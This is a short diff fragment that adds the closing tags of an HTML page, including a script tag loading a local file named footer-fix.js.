+    </div>
+    <script src="/assets/footer-fix.js"></script>
+</footer>
+</div>
+    </body>
+</html>
